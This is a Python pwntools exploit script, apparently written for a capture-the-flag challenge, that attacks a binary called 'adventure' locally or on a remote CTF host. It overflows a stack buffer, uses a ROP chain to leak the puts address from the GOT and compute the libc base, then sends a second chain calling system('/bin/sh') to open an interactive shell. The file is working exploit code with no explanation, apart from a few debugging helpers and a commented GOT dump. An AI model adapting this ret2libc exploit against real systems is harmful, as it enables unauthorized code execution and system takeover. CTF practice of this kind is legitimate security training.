#!/usr/bin/python3

from pwn import *

exe = ELF('adventure_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b* 0x401267
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30014)
else:
        p = process(exe.path)

GDB()
push_rbp = 0x000000000040121a
pop_rdi = 0x000000000040121e
stack = 0x404a00
def se(payload):
        sla(b'choice: ', b'2')
        sla(b'No', b'1')
        sla(b"a name", payload)
payload = b'a'*0x20 + p64(0x404a00) + p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(pop_rdi) + p64(0x404a00+8) 
payload += p64(exe.sym.gets) + p64(0x000000000040129d)
se(payload)
p.recvuntil(b"with aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")
libc.address = u64(p.recvline(keepends=False) + b'\0\0') - libc.sym.puts
info("libc " + hex(libc.address))
sleep(5)
payload = flat(pop_rdi+1,pop_rdi, next(libc.search(b'/bin/sh')), libc.sym.system)
sl(payload)
p.interactive()
'''
[0x404030] gets@GLIBC_2.2.5 -> 0x401060 ◂— endbr64
[0x404038] fflush@GLIBC_2.2.5 -> 0x401070 ◂— endbr64
[0x404040] setvbuf@GLIBC_2.2.5 -> 0x401080 ◂— endbr64
[0x404048] __isoc99_scanf@GLIBC_2.7 -> 0x401090 ◂— endbr64
[0x404050] exit@GLIBC_2.2.5 -> 0x4010a0 ◂— endbr64
'''